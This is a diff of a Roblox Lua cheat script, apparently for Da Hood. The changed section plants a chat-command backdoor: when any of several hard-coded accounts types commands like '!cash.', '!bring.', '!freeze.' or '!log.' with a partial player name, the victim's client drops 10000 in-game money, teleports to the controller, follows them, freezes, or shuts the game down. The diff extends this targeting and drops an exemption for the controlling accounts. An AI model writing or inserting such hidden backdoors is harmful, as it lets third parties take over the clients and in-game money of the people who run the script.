@@ -6129,78 +6129,141 @@ _G.Loopohoh = game.Players.LocalPlayer.CharacterAdded:connect(function()
     game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Bar.Energy.bar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 end)
 
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local localskid = game.Players.localPlayer
+-- Function to send a chat message
 function chat(msg)
     local A_1 = msg
     local A_2 = "All"
-    local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+    local Event = ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
     Event:FireServer(A_1, A_2)
 end
 
-local targetNames = {"isthisdo23", "cruciatusadidas", "roopin01", "deeralttrue","Rag0_IQ","dahoodbotmoney5"}
-if table.find(targetNames, game.Players.LocalPlayer.Name) then
-    print("Prem")
-else
-    function PoorCharacter(targetPlayer)
+local targetNames = {"isthisdo23", "cruciatusadidas", "roopin01", "deeralttrue", "Rag0_IQ", "dahoodbotmoney5"}
+
+-- Function to find a player by partial name
+function gplr(partialName)
+    local lowerPartial = partialName:lower()
+    for _, v in pairs(Players:GetPlayers()) do
+        if v.Name:lower():sub(1, #partialName) == lowerPartial or v.DisplayName:lower():sub(1, #partialName) == lowerPartial then
+            return v
+        end
+    end
+    return nil
+end
+
+local function PoorCharacteccr(targetPlayer)
     targetPlayer.Chatted:Connect(function(msg)
-        if msg:lower() == "!cash." then
-            local args = {
-                [1] = "DropMoney",
-                [2] = "10000"
-            }
-            game:GetService("ReplicatedStorage"):WaitForChild("MainEvent"):FireServer(unpack(args))
-        elseif msg:lower() == "!bring." then
-            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -2)
-        elseif msg:lower() == "!log." then
-            game:Shutdown()
-        elseif msg:lower() == "!freeze." then
-            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
-        elseif msg:lower() == "!sleep." then
-            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 0) * CFrame.Angles(math.pi * 0.5, 0, 0)
-            game.Players.LocalPlayer.Character.Humanoid.Sit = true
-            task.wait(0.1)
-            local Char = game.Players.LocalPlayer.Character
-            local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")
-            for i, v in next, Hum:GetPlayingAnimationTracks() do
-                v:Stop()
+        local command = msg:lower()
+        local args = string.split(msg, " ")
+
+        if command:match("^!cash%.") then
+            local partialName = args[2]
+            local player = gplr(partialName)
+            if player.Name == localskid.Name then
+                local args = {"DropMoney", "10000"}
+                ReplicatedStorage:WaitForChild("MainEvent"):FireServer(unpack(args))
             end
-        elseif msg:lower() == "!unfreeze." then
-            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-        elseif msg:lower() == "!reset." then
-            game.ReplicatedStorage.MainEvent:FireServer("ResetNew")
-            game.Players.LocalPlayer.Character.Humanoid:ChangeState('Dead')
-        elseif msg:lower() == "/e ok" then
+        elseif command:match("^!bring%.") then
+            local partialName = args[2]
+            local player = gplr(partialName)
+            if player.Name == localskid.Name then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -2)
+            end
+        elseif command:match("^!follow%.") then
+            local partialName = args[2]
+            local player = gplr(partialName)
+            if player.Name == localskid.Name then
+                _G.Follow = game:GetService("RunService").Heartbeat:Connect(function()
+                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 5)
+                end)
+            end
+        elseif command:match("^!unfollow%.") then
+            local partialName = args[2]
+            local player = gplr(partialName)
+            if player.Name == localskid.Name then
+                if _G.Follow then _G.Follow:Disconnect() end
+            end
+        elseif command:match("^!log%.") then
+            local partialName = args[2]
+            local player = gplr(partialName)
+            if player.Name == localskid.Name then
+                game:Shutdown()
+            end
+        elseif command:match("^!freeze%.") then
+            local partialName = args[2]
+            local player = gplr(partialName)
+            if player.Name == localskid.Name then
+                player.Character.HumanoidRootPart.Anchored = true
+            end
+        elseif command:match("^!sleep%.") then
+            local partialName = args[2]
+            local player = gplr(partialName)
+            if player.Name == localskid.Name then
+                local char = game.Players.LocalPlayer.Character
+                local hum = char:FindFirstChildOfClass("Humanoid") or char:FindFirstChildOfClass("AnimationController")
+                char.HumanoidRootPart.CFrame = char.HumanoidRootPart.CFrame * CFrame.new(0, 0, 0) * CFrame.Angles(math.pi * 0.5, 0, 0)
+                char.Humanoid.Sit = true
+                task.wait(0.1)
+                for _, track in pairs(hum:GetPlayingAnimationTracks()) do
+                    track:Stop()
+                end
+            end
+        elseif command == "!unfreeze." then
+            local partialName = args[2]
+            local player = gplr(partialName)
+            if player.Name == localskid.Name then
+                player.Character.HumanoidRootPart.Anchored = false
+            end
+        elseif command:match("^!reset%.") then
+            local partialName = args[2]
+            local player = gplr(partialName)
+            if player.Name == localskid.Name then
+                ReplicatedStorage.MainEvent:FireServer("ResetNew")
+                player.Character.Humanoid:ChangeState('Dead')
+            end
+        elseif command == "/e ok" or command == "/e test" then
             chat("HELLO")
-        elseif msg:lower() == "/e test" then
-            chat("HELLO")
-        elseif msg:lower() == "!rejoin." then
-            game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
-        elseif msg:lower() == "!dance." then
-            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -2)
-            local DefaultDanceanim = Instance.new('Animation')
-            DefaultDanceanim.AnimationId = "rbxassetid://11710529975"
-            game:GetService('Players').LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(DefaultDanceanim):Play()
+        elseif command == "!rejoin." then
+            local partialName = args[2]
+            local player = gplr(partialName)
+            if player.Name == localskid.Name then
+                game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
+            end
+        elseif command == "!dance." then
+            local partialName = args[2]
+            local player = gplr(partialName)
+            if player.Name == localskid.Name then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -2)
+                local danceAnim = Instance.new('Animation')
+                danceAnim.AnimationId = "rbxassetid://11710529975"
+                game.Players.LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(danceAnim):Play()
+            end
         end
     end)
 end
 
+-- Check existing players
 for _, targetName in pairs(targetNames) do
-    local player = game.Players:FindFirstChild(targetName)
+    local player = Players:FindFirstChild(targetName)
     if player then
         print(targetName .. " in server")
-        PoorCharacter(player)
+        PoorCharacteccr(player)
     end
 end
 
-game.Players.PlayerAdded:Connect(function(newPlayer)
+-- Connect to new players joining
+Players.PlayerAdded:Connect(function(newPlayer)
     for _, targetName in pairs(targetNames) do
         if newPlayer.Name == targetName then
             print(targetName .. " just joined")
             task.wait(1)
-            PoorCharacter(newPlayer)
+            PoorCharacteccr(newPlayer)
         end
     end
 end)
-end
+
 end
 
 
